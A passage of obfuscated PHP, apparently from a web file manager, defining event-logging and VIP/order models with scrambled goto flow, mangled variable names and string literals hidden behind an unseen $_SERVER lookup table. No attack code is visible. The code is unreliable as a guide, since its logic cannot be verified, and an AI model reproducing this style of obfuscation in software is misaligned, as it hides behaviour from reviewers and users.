$aÒé¶íØ·[1718] => $Ağ ƒ¯­); goto F˜„¥È´ÙÒ; BµİªĞ‚Ñ¸: $aÒé¶íØ· =& $_SERVER[°Óó£ÌİóèÅ]; $a˜ÂÓƒ®ƒ = array(); $Ağ ƒ¯­ = array(); goto d»å³ÁÄ»‚; d»å³ÁÄ»‚: foreach ($d‚Ü±³¼Ì as $dÂó‹ÙàÛ¶) { if ($dÂó‹ÙàÛ¶[$aÒé¶íØ·[401]] == SourceModel::TYPE_USER) { $a˜ÂÓƒ®ƒ[] = intval($dÂó‹ÙàÛ¶[$aÒé¶íØ·[403]]); } else { if ($dÂó‹ÙàÛ¶[$aÒé¶íØ·[401]] == SourceModel::TYPE_GROUP) { $Ağ ƒ¯­[] = intval($dÂó‹ÙàÛ¶[$aÒé¶íØ·[403]]); } } } if ($a˜ÂÓƒ®ƒ) { $a˜ÂÓƒ®ƒ = Model($aÒé¶íØ·[1716])->userListInfo($a˜ÂÓƒ®ƒ); } if ($Ağ ƒ¯­) { $FîŠŸ¹±ôŠ = array($aÒé¶íØ·[1629] => array($aÒé¶íØ·[563], $Ağ ƒ¯­)); $Ağ ƒ¯­ = Model($aÒé¶íØ·[1710])->field($aÒé¶íØ·[1646])->where($FîŠŸ¹±ôŠ)->select(); $Ağ ƒ¯­ = array_to_keyvalue($Ağ ƒ¯­, $aÒé¶íØ·[1546]); } goto a¿¼Ù›Ú£; F˜„¥È´ÙÒ: } private function authInfo($Dë†àÄçˆô) { $bè°–ÚÊ¯Ò =& $_SERVER[°Óó£ÌİóèÅ]; if ($Dë†àÄçˆô[$bè°–ÚÊ¯Ò[1683]]) { $BœóÅƒñÒ = Model($bè°–ÚÊ¯Ò[1699])->listData($Dë†àÄçˆô[$bè°–ÚÊ¯Ò[1683]]); if (!$BœóÅƒñÒ) { return !1; $F´²ÊÒ­¹¯ = Model($bè°–ÚÊ¯Ò[1699])->listData(); $FÌ®áÏ‘ï§ = array_filter_by_field($F´²ÊÒ­¹¯, $bè°–ÚÊ¯Ò[557], $bè°–ÚÊ¯Ò[410]); return $FÌ®áÏ‘ï§; } $cëİßÃÍ¹ = array_field_key($BœóÅƒñÒ, array($bè°–ÚÊ¯Ò[376], $bè°–ÚÊ¯Ò[28], $bè°–ÚÊ¯Ò[557], $bè°–ÚÊ¯Ò[1564], $bè°–ÚÊ¯Ò[1567])); $cëİßÃÍ¹[$bè°–ÚÊ¯Ò[1719]] = $Dë†àÄçˆô; return $cëİßÃÍ¹; } else { return array($bè°–ÚÊ¯Ò[814] => 0, $bè°–ÚÊ¯Ò[1552] => $Dë†àÄçˆô[$bè°–ÚÊ¯Ò[1684]], $bè°–ÚÊ¯Ò[395] => $bè°–ÚÊ¯Ò[33], $bè°–ÚÊ¯Ò[1564] => $bè°–ÚÊ¯Ò[1720]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\x72\143\x65\137\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\x54\x69\155\x65", "\164\151\x6d\145", "\151\156\x73\145\162\x74", "\x66\x75\156\x63\x74\151\x6f\x6e"), array("\144\x65\163\x63", '', "\151\156\163\145\x72\x74\54\165\160\144\x61\164\145\x2c\163\x65\x6c\x65\143\x74", "\152\x73\x6f\x6e")); public function addEvent($dóÜŞÓø®Ù, $bëÉãŸå§º, $dåÄÇÉ¼Ô = '') { goto BŞ’Ûô»œ¤; c²ô‘Šã¡ô: return $this->add($f²ƒ ¡ˆŞ); goto b¥Ãê”ÕÓù; c£İ‰·ğÅ: if ($dåÄÇÉ¼Ô && is_string($dåÄÇÉ¼Ô)) { $dåÄÇÉ¼Ô = array($díµÛí¸¶Ø[1577] => $dåÄÇÉ¼Ô); } $f²ƒ ¡ˆŞ = array($díµÛí¸¶Ø[423] => $dóÜŞÓø®Ù, $díµÛí¸¶Ø[1721] => $BÆ¦á‰ÆåØ[$díµÛí¸¶Ø[392]], $díµÛí¸¶Ø[1086] => USER_ID, $díµÛí¸¶Ø[812] => $bëÉãŸå§º, $díµÛí¸¶Ø[1088] => $dåÄÇÉ¼Ô); $this->addSystemLog($bëÉãŸå§º, $f²ƒ ¡ˆŞ); goto c²ô‘Šã¡ô; BŞ’Ûô»œ¤: $díµÛí¸¶Ø =& $_SERVER[°Óó£ÌİóèÅ]; $BÆ¦á‰ÆåØ = Model($díµÛí¸¶Ø[852])->sourceInfo($dóÜŞÓø®Ù); if (!$BÆ¦á‰ÆåØ) { return !1; } goto c£İ‰·ğÅ; b¥Ãê”ÕÓù: } private function addSystemLog($F¯ÉëÆÄ¹», $Dğƒµ“ÃÚ) { $aÃ÷ «ŒªŒ =& $_SERVER[°Óó£ÌİóèÅ]; if ($F¯ÉëÆÄ¹» == $aÃ÷ «ŒªŒ[1722]) { $F¯ÉëÆÄ¹» = $Dğƒµ“ÃÚ[$aÃ÷ «ŒªŒ[1590]][$aÃ÷ «ŒªŒ[1723]]; } else { if (in_array($F¯ÉëÆÄ¹», array($aÃ÷ «ŒªŒ[1523], $aÃ÷ «ŒªŒ[1724]))) { $F¯ÉëÆÄ¹» = $Dğƒµ“ÃÚ[$aÃ÷ «ŒªŒ[1590]][$aÃ÷ «ŒªŒ[457]]; } } $a‡šêÖÏ¿ = array_merge($Dğƒµ“ÃÚ, array($aÃ÷ «ŒªŒ[1725] => $Dğƒµ“ÃÚ[$aÃ÷ «ŒªŒ[382]], $aÃ÷ «ŒªŒ[1726] => $Dğƒµ“ÃÚ[$aÃ÷ «ŒªŒ[1726]])); Model($aÃ÷ «ŒªŒ[1487])->addLog($aÃ÷ «ŒªŒ[1727] . $F¯ÉëÆÄ¹», $a‡šêÖÏ¿); } public function eventCreate($C¹¦Á¡²÷“, $Dùëµß¦) { $cÙ‘ßÍ£Öò =& $_SERVER[°Óó£ÌİóèÅ]; $ağè¨‘ù¯ = Model($cÙ‘ßÍ£Öò[852])->sourceInfo($C¹¦Á¡²÷“); $F·¦¨Æí˜ = array($cÙ‘ßÍ£Öò[1723] => $Dùëµß¦, $cÙ‘ßÍ£Öò[28] => $ağè¨‘ù¯[$cÙ‘ßÍ£Öò[28]]); return $this->addEvent($C¹¦Á¡²÷“, $cÙ‘ßÍ£Öò[1722], $F·¦¨Æí˜); } public function eventFileEdit($cÀ„ô”œ‹†) { return $this->addEvent($cÀ„ô”œ‹†, $_SERVER[°Óó£ÌİóèÅ][1515]); } public function eventRecycle($d‚ëõ…‹Ù, $b¼„›¹ºØ) { return $this->addEvent($d‚ëõ…‹Ù, $_SERVER[°Óó£ÌİóèÅ][1724], $b¼„›¹ºØ); } public function eventRemove($a¬Ò†å£¨¡) { $Eó‘‚ù…©é =& $_SERVER[°Óó£ÌİóèÅ]; $bÌİîÃ¯º = Model($Eó‘‚ù…©é[852])->sourceInfo($a¬Ò†å£¨¡); $Bá’ß„¥…¨ = $bÌİîÃ¯º[$Eó‘‚ù…©é[28]]; return $this->addEvent($bÌİîÃ¯º[$Eó‘‚ù…©é[392]], $Eó‘‚ù…©é[1514], $Bá’ß„¥…¨); } public function eventShare($Eå½ÌÊ´, $aŸâÈéÅçÊ) { return $this->addEvent($Eå½ÌÊ´, $_SERVER[°Óó£ÌİóèÅ][1523], $aŸâÈéÅçÊ); } public function eventMove($D›İ¯õ´ «, $fèİª‚ß„Ô, $fŸ¥ŞÕÆ‚) { goto a¯ß¶•ÙæÚ; D¿ŞÔóÊº¿: $this->addEvent($fèİª‚ß„Ô, $dĞß•‰Á×[1730], $cà”ëéØì‘); goto fÄÕ±¨Ò«‰; b‹„¤ æÜ›: $bê¥±å«î = $báåÜÖÇæ->sourceInfo($fèİª‚ß„Ô); $eó°ÏŞšÕÃ = $báåÜÖÇæ->sourceInfo($fŸ¥ŞÕÆ‚); $cà”ëéØì‘ = array($dĞß•‰Á×[752] => $fèİª‚ß„Ô, $dĞß•‰Á×[1728] => $bê¥±å«î[$dĞß•‰Á×[28]], $dĞß•‰Á×[753] => $fŸ¥ŞÕÆ‚, $dĞß•‰Á×[1729] => $eó°ÏŞšÕÃ[$dĞß•‰Á×[28]]); goto C¬Ò¡½õ‚š; a¯ß¶•ÙæÚ: $dĞß•‰Á× =& $_SERVER[°Óó£ÌİóèÅ]; $báåÜÖÇæ = Model($dĞß•‰Á×[852]); $dù¯öç½İ = $báåÜÖÇæ->sourceInfo($D›İ¯õ´ «); goto b‹„¤ æÜ›; C¬Ò¡½õ‚š: $this->addEvent($D›İ¯õ´ «, $dĞß•‰Á×[742], $cà”ëéØì‘); $dù¯öç½İ = $báåÜÖÇæ->sourceInfo($D›İ¯õ´ «); $cà”ëéØì‘ = array($dĞß•‰Á×[382] => $dù¯öç½İ[$dĞß•‰Á×[382]], $dĞß•‰Á×[28] => $dù¯öç½İ[$dĞß•‰Á×[28]]); goto D¿ŞÔóÊº¿; fÄÕ±¨Ò«‰: } public function eventCopy($c‡Œ–ÉøŠ‹) { $this->eventCreate($c‡Œ–ÉøŠ‹, $_SERVER[°Óó£ÌİóèÅ][741]); } public function eventRename($E†õ«Â×¶Ş, $DÅÙ˜™¯‚, $A®¦œä’£í) { $E„²Ä¦¹å× =& $_SERVER[°Óó£ÌİóèÅ]; $F“½¶¢Û–è = array($E„²Ä¦¹å×[752] => $DÅÙ˜™¯‚, $E„²Ä¦¹å×[753] => $A®¦œä’£í); return $this->addEvent($E†õ«Â×¶Ş, $E„²Ä¦¹å×[864], $F“½¶¢Û–è); } public function eventAddComment($B’¢Ÿ—–, $AŒèé‰²À¤) { return $this->addEvent($B’¢Ÿ—–, $_SERVER[°Óó£ÌİóèÅ][1731], $AŒèé‰²À¤); } public function eventAddDesc($BÆ¹ÆĞŒ´£, $CõÑ£¢œ¯„) { return $this->addEvent($BÆ¹ÆĞŒ´£, $_SERVER[°Óó£ÌİóèÅ][1732], $CõÑ£¢œ¯„); } public function listBySource($A²´ŸÍ˜Ö£) { goto fá¿Ö††›; fá¿Ö††›: $dÓ†Œ—¶…Ã =& $_SERVER[°Óó£ÌİóèÅ]; $A¤›£ÓÚõ´ = Model($dÓ†Œ—¶…Ã[852])->sourceInfo($A²´ŸÍ˜Ö£); $dÙàø‚ÊÆõ = array($dÓ†Œ—¶…Ã[423] => $A²´ŸÍ˜Ö£); goto A¬¢ØòÊÛ™; a¿÷ìš¯¼‘: $DÁºÊƒøåÂ = $this->eventListParse($DÁºÊƒøåÂ, $A²´ŸÍ˜Ö£); show_json($DÁºÊƒøåÂ); goto C¼§ö‚Úµ; A¬¢ØòÊÛ™: if ($A¤›£ÓÚõ´[$dÓ†Œ—¶…Ã[383]] == $dÓ†Œ—¶…Ã[384]) { $B¡ÍÂ×‡Ş = Model($dÓ†Œ—¶…Ã[852])->listSearchChildren($A²´ŸÍ˜Ö£, 20000); $B¡ÍÂ×‡Ş[] = $A²´ŸÍ˜Ö£; $dÙàø‚ÊÆõ = array($dÓ†Œ—¶…Ã[382] => array($dÓ†Œ—¶…Ã[7], $B¡ÍÂ×‡Ş)); } $DÁºÊƒøåÂ = $this->where($dÙàø‚ÊÆõ)->order($dÓ†Œ—¶…Ã[1733])->selectPage(); if ($DÁºÊƒøåÂ[$dÓ†Œ—¶…Ã[361]][$dÓ†Œ—¶…Ã[362]] == 0) { $DÁºÊƒøåÂ[$dÓ†Œ—¶…Ã[361]][$dÓ†Œ—¶…Ã[362]] = 1; $DÁºÊƒøåÂ[$dÓ†Œ—¶…Ã[364]] = array(array($dÓ†Œ—¶…Ã[423] => $A²´ŸÍ˜Ö£, $dÓ†Œ—¶…Ã[1721] => $A¤›£ÓÚõ´[$dÓ†Œ—¶…Ã[392]], $dÓ†Œ—¶…Ã[1086] => $A¤›£ÓÚõ´[$dÓ†Œ—¶…Ã[1734]], $dÓ†Œ—¶…Ã[812] => $dÓ†Œ—¶…Ã[1735], $dÓ†Œ—¶…Ã[1587] => $A¤›£ÓÚõ´[$dÓ†Œ—¶…Ã[195]], $dÓ†Œ—¶…Ã[1088] => $dÓ†Œ—¶…Ã[33])); } goto a¿÷ìš¯¼‘; C¼§ö‚Úµ: } private function eventListParse($dÂˆÀ­ˆ÷», $EŠ¨•†¥•Ô) { goto C—“Ç×´›Ê; A¯šî¥Âè: return $dÂˆÀ­ˆ÷»; goto E½„†ßÒ; DÛì’ê…í: $BßÙÀç˜ŞË = array_to_keyvalue($còˆ†…ÕŒ, $C™¡“ƒ‰Ì[33], $C™¡“ƒ‰Ì[1726]); foreach ($còˆ†…ÕŒ as $d×ŞÕƒİô¢) { $bÛÖ»œ‘µò = $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[1590]]; if ($d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[29]] == $C™¡“ƒ‰Ì[742] && isset($bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[752]])) { $E¨¸†¨öƒå[] = $bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[752]]; $E¨¸†¨öƒå[] = $bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[753]]; } if ($d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[29]] == $C™¡“ƒ‰Ì[1730] && isset($bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[382]])) { $E¨¸†¨öƒå[] = $bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[382]]; } } $E¨¸†¨öƒå = array_merge($E¨¸†¨öƒå, $BßÙÀç˜ŞË, array($EŠ¨•†¥•Ô)); goto dŒ¾‰†¡”©; C—“Ç×´›Ê: $C™¡“ƒ‰Ì =& $_SERVER[°Óó£ÌİóèÅ]; $còˆ†…ÕŒ = $dÂˆÀ­ˆ÷»[$C™¡“ƒ‰Ì[364]]; $E¨¸†¨öƒå = array_to_keyvalue($còˆ†…ÕŒ, $C™¡“ƒ‰Ì[33], $C™¡“ƒ‰Ì[382]); goto DÛì’ê…í; F»Öâ„á†§: $c©ÏãËÇá« = Model($C™¡“ƒ‰Ì[529])->sourceListInfo($E¨¸†¨öƒå, !0); foreach ($còˆ†…ÕŒ as &$d×ŞÕƒİô¢) { goto bøğ°ÊÑ¢¿; E†¹Šßé: $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[858]] = $c©ÏãËÇá«[$d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[382]]]; $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[1736]] = $c©ÏãËÇá«[$d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[1726]]]; if ($d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[29]] == $C™¡“ƒ‰Ì[1514]) { $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[1736]] = $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[858]]; $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[1726]] = $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[1736]][$C™¡“ƒ‰Ì[382]]; $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[858]] = !1; $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[382]] = $C™¡“ƒ‰Ì[33]; } goto DŠó’õÅÜš; bøğ°ÊÑ¢¿: $bÛÖ»œ‘µò =& $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[1590]]; if ($d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[29]] == $C™¡“ƒ‰Ì[742] && isset($bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[752]])) { $bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[752]] = $c©ÏãËÇá«[$bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[752]]]; $bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[753]] = $c©ÏãËÇá«[$bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[753]]]; } if ($d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[29]] == $C™¡“ƒ‰Ì[1730] && isset($bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[382]])) { $bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[382]] = $c©ÏãËÇá«[$bÛÖ»œ‘µò[$C™¡“ƒ‰Ì[382]]]; } goto E†¹Šßé; DŠó’õÅÜš: $d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[1688]] = $fÀŸÅî®Œä[$d×ŞÕƒİô¢[$C™¡“ƒ‰Ì[1095]]]; goto FšÉÑÄÖñ˜; FšÉÑÄÖñ˜: } $dÂˆÀ­ˆ÷»[$C™¡“ƒ‰Ì[364]] = $còˆ†…ÕŒ; goto A¯šî¥Âè; dŒ¾‰†¡”©: $E¨¸†¨öƒå = array_unique($E¨¸†¨öƒå); $F¸îê„¥ÀŒ = array_unique(array_to_keyvalue($còˆ†…ÕŒ, $C™¡“ƒ‰Ì[33], $C™¡“ƒ‰Ì[1095])); $fÀŸÅî®Œä = Model($C™¡“ƒ‰Ì[1481])->userListInfo($F¸îê„¥ÀŒ); goto F»Öâ„á†§; E½„†ßÒ: } public function removeBySource($DŠëË¸åÚ) { $C¿º‡ì¬í = array($_SERVER[°Óó£ÌİóèÅ][423] => $DŠëË¸åÚ); $this->where($C¿º‡ì¬í)->remove(); } } goto F¶À–¢ğ±; b¸Ó„Ï‰‹: class VipModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x6f\160\164\151\x6f\x6e"; public function edit($A°èß‚”Ñ, $dñ¿²§“¯£) { goto d•´æ‡•·©; DÊ¤î£: if (!$this->where($D‚´™Û£Ç)->find()) { $D‚´™Û£Ç[$f·ù×İ¨†[367]] = $d£êÊÊ«Ä; return $this->add($D‚´™Û£Ç); } $aå»ôĞ×¼† = $this->where($D‚´™Û£Ç)->save(array($f·ù×İ¨†[367] => $d£êÊÊ«Ä)); Cache::remove($f·ù×İ¨†[1980] . $A°èß‚”Ñ); goto dİÜ¯»‰¶÷; dİÜ¯»‰¶÷: return $aå»ôĞ×¼†; goto e¥„â¿Ş°­; d•´æ‡•·©: $f·ù×İ¨† =& $_SERVER[°Óó£ÌİóèÅ]; $d£êÊÊ«Ä = json_encode($dñ¿²§“¯£); $D‚´™Û£Ç = array($f·ù×İ¨†[1095] => $A°èß‚”Ñ, $f·ù×İ¨†[29] => $f·ù×İ¨†[1978], $f·ù×İ¨†[96] => $f·ù×İ¨†[1979]); goto DÊ¤î£; e¥„â¿Ş°­: } public function vipList($a´„Ó´é¸¼) { goto DÆ«íšÃ¿; fÏŠ†¬Î: $this->_listUserApply($dÖç¿Ó¹‰Ê[$b²ºçª¦§¨[364]]); return $dÖç¿Ó¹‰Ê; goto FÃñØ¦ëÄâ; DÆ«íšÃ¿: $b²ºçª¦§¨ =& $_SERVER[°Óó£ÌİóèÅ]; $cÄãÁèòæĞ = array($b²ºçª¦§¨[29] => $b²ºçª¦§¨[1978], $b²ºçª¦§¨[96] => $b²ºçª¦§¨[1979]); if (!empty($a´„Ó´é¸¼[$b²ºçª¦§¨[467]])) { $C£Ì¿‡Ñß = $a´„Ó´é¸¼[$b²ºçª¦§¨[467]]; $Bƒ‹Åœ¼ª‘ = !empty($a´„Ó´é¸¼[$b²ºçª¦§¨[468]]) ? $a´„Ó´é¸¼[$b²ºçª¦§¨[468]] : time(); $cÄãÁèòæĞ[$b²ºçª¦§¨[195]] = array($b²ºçª¦§¨[332], array($C£Ì¿‡Ñß, $Bƒ‹Åœ¼ª‘)); } goto AåØĞ“Ê°İ; AåØĞ“Ê°İ: if (in_array($a´„Ó´é¸¼[$b²ºçª¦§¨[29]], array($b²ºçª¦§¨[1981], $b²ºçª¦§¨[1982]))) { $cÄãÁèòæĞ[$b²ºçª¦§¨[367]] = array($b²ºçª¦§¨[528], "\x25{$a´„Ó´é¸¼[$b²ºçª¦§¨[29]]}\x25"); } $dÖç¿Ó¹‰Ê = $this->where($cÄãÁèòæĞ)->selectPage(); if (empty($dÖç¿Ó¹‰Ê[$b²ºçª¦§¨[364]])) { show_json(array(), !0, $dÖç¿Ó¹‰Ê[$b²ºçª¦§¨[361]]); } goto fÏŠ†¬Î; FÃñØ¦ëÄâ: } private function _listUserApply(&$BÈ¤ÍˆÏ¼«) { goto aâ¤œÉŞâŸ; aâ¤œÉŞâŸ: $c£ğ®ÁÔ° =& $_SERVER[°Óó£ÌİóèÅ]; $Aôñ–öÕ«„ = array_to_keyvalue($BÈ¤ÍˆÏ¼«, $c£ğ®ÁÔ°[33], $c£ğ®ÁÔ°[1095]); $b™µÁÏ­Æ‹ = Model($c£ğ®ÁÔ°[1481])->userListInfo(array_unique($Aôñ–öÕ«„)); goto fœñ‡ô›åæ; Føª‚ÒƒšÉ: $fé»áéõ¶ï = array($c£ğ®ÁÔ°[376], $c£ğ®ÁÔ°[1095], $c£ğ®ÁÔ°[195], $c£ğ®ÁÔ°[114]); foreach ($BÈ¤ÍˆÏ¼« as $AÇˆŠ•´¯¶ => $EµâÓ¾ˆˆ) { $bÄ…ññ¢ùÉ = $EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[1095]]; $AÍ“ÛËß‚Ü[$AÇˆŠ•´¯¶] = array($c£ğ®ÁÔ°[376] => $EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[376]], $c£ğ®ÁÔ°[1095] => $EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[1095]], $c£ğ®ÁÔ°[1983] => json_decode($EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[367]], !0), $c£ğ®ÁÔ°[195] => $EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[195]], $c£ğ®ÁÔ°[114] => $EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[114]], $c£ğ®ÁÔ°[1688] => isset($b™µÁÏ­Æ‹[$bÄ…ññ¢ùÉ]) ? $b™µÁÏ­Æ‹[$bÄ…ññ¢ùÉ] : null); } $BÈ¤ÍˆÏ¼« = $AÍ“ÛËß‚Ü; goto aÔâÜ®«—; fœñ‡ô›åæ: foreach ($BÈ¤ÍˆÏ¼« as &$EµâÓ¾ˆˆ) { $bÄ…ññ¢ùÉ = $EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[1095]]; if (isset($EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[367]])) { $EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[367]] = json_decode($EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[367]], !0); } $EµâÓ¾ˆˆ[$c£ğ®ÁÔ°[1688]] = isset($b™µÁÏ­Æ‹[$bÄ…ññ¢ùÉ]) ? $b™µÁÏ­Æ‹[$bÄ…ññ¢ùÉ] : null; } return; $AÍ“ÛËß‚Ü = array(); goto Føª‚ÒƒšÉ; aÔâÜ®«—: } public function orderList($fÇëô…±…ï) { goto d÷ÆÈ…„ó°; Dó¯İ“ï“: if (!empty($fÇëô…±…ï[$AŞ×é…å×[29]])) { $C½›¯ŠÀğ©[$AŞ×é…å×[29]] = $fÇëô…±…ï[$AŞ×é…å×[29]]; } if (isset($fÇëô…±…ï[$AŞ×é…å×[454]]) && $fÇëô…±…ï[$AŞ×é…å×[454]] != $AŞ×é…å×[33]) { $C½›¯ŠÀğ©[$AŞ×é…å×[454]] = $fÇëô…±…ï[$AŞ×é…å×[454]]; } $aÊ„ŸÜÅ­« = Model($AŞ×é…å×[1984])->where($C½›¯ŠÀğ©)->selectPage(); goto F†½Ãê; d÷ÆÈ…„ó°: $AŞ×é…å× =& $_SERVER[°Óó£ÌİóèÅ]; $C½›¯ŠÀğ© = array(); if (!empty($fÇëô…±…ï[$AŞ×é…å×[467]])) { $B‰¾¹ëôÄò = $fÇëô…±…ï[$AŞ×é…å×[467]]; $d½§Å¯‰êª = !empty($fÇëô…±…ï[$AŞ×é…å×[468]]) ? $fÇëô…±…ï[$AŞ×é…å×[468]] : time(); $C½›¯ŠÀğ©[$AŞ×é…å×[195]] = array($AŞ×é…å×[332], array($B‰¾¹ëôÄò, $d½§Å¯‰êª)); } goto Dó¯İ“ï“; F†½Ãê: if (empty($aÊ„ŸÜÅ­«[$AŞ×é…å×[364]])) { show_json(array(), !0, $aÊ„ŸÜÅ­«[$AŞ×é…å×[361]]); } $this->_listUserApply($aÊ„ŸÜÅ­«[$AŞ×é…å×[364]]); return $aÊ„ŸÜÅ­«; goto eÓÓ¦ôˆ°; eÓÓ¦ôˆ°: } }